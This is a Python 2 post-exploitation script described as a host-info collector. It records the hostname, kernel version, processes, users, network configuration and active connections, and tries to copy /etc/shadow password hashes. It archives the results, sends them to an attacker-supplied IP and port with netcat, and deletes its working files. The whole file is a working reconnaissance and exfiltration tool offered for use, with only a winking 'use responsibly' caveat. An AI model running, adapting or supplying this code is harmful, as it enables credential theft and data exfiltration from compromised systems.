#!/usr/bin/python
import os,subprocess,argparse,tarfile

par=argparse.ArgumentParser(description='Collect host info',epilog='Use responsibly ;)')
par.add_argument('-F','--file',help='specify directory to store output. Uses temp directory by default')
par.add_argument('-A',help='collect everything',action='store_true')
par.add_argument('-o',help='get hostname',action='store_true')
par.add_argument('-v',help='get linux version',action='store_true')
par.add_argument('-p',help='collect running processes',action='store_true')
par.add_argument('-u',help='collect local user list',action='store_true')
par.add_argument('-s',help='attempt to copy the shadow file',action='store_true')
par.add_argument('-i',help='grab network configuration',action='store_true')
par.add_argument('-n',help='list active connections',action='store_true')
par.add_argument('IP',help='IP of listener')
par.add_argument('PORT',help='port of listener')
args=par.parse_args()

#Prints contents of a list to the console line by line
def con_out(input):
    for x in input:
        print x

#Check if the user specified a directory, if not create and use a temp directory
if args.file:
    output=args.file
else:
    output=subprocess.check_output(['mktemp','-d']).strip()
os.chdir(output)

#Determine hostname
if args.o or args.A:
    hostname=subprocess.check_output(['hostname']).strip()
    with open('basic_info', 'w+') as f:
        f.write('Hostname: '+hostname)
    print hostname
        
#Get Linux version
if args.v or args.A:
    ver=subprocess.check_output(['uname','-r'])
    with open('basic_info','a') as f:
        f.write('\n'+ver)
    print ver

#Grab the process list
if args.p or args.A:
    ps=subprocess.check_output(['ps','-aux']).split('\n')
    with open('./processes', 'w+') as f:
        for x in ps:
            f.write(x+'\n')
    con_out(ps)

#Grab the local user list
if args.u or args.A:
    users=subprocess.check_output(['cat','/etc/passwd']).split('\n')
    with open('./users', 'w+') as f:
        for x in users:
            f.write(x+'\n')
    con_out(users)

#Grab Network configuration
if args.i or args.A:
    net=subprocess.check_output(['ifconfig']).split('\n')
    with open('./network', 'w+') as f:
        for x in net:
            f.write(x+'\n')
        f.write('\n')
    con_out(net)
    route=subprocess.check_output(['route','-n']).split('\n')
    with open('./network', 'a') as f:
        for x in route:
            f.write(x+'\n')
    con_out(route)   

#Find active listeners with netstat
if args.n or args.A:
    nstat=subprocess.check_output(['netstat','-ano']).split('\n')
    with open('./network', 'a') as f:
        for x in nstat:
            f.write(x+'\n')
    con_out(nstat)
        
#Check if we can read the shadow file and add to collection if so
if args.s or args.A:
    try:
        secret=subprocess.check_output(['cat','/etc/shadow']).split('\n')
        with open('./shadow', 'w+') as f:
            for x in secret:
                f.write(x+'\n')
        con_out(secret)
    except:
        pass
        
#Compress all of the above output into one file
print 'Compressing all collected info...'
FNULL=open(os.devnull,'w')
archive=hostname+'.tar'
subprocess.call(['tar','-czf',archive,'-C',output,'.'],stdout=FNULL,stderr=subprocess.STDOUT)

#Send it all back via netcat
#First we need to make sure the return box is ready
print '\n'
raw_input('Press Enter once listener is active...')
#Push the tar file to the target listener
print 'Uploading...'
nccmd='nc -w3 '+args.IP+' '+args.PORT+' < '+output+'/'+hostname+'.tar'
try:
    subprocess.call(['/bin/sh','-c',nccmd])
    print '\nUploaded sucessfully.'
except:
    print '\nError: Could not connect.'

#Clean up
print '\nCleaning up temp files...'
subprocess.call(['rm','-rf',output])

print '\nDone.'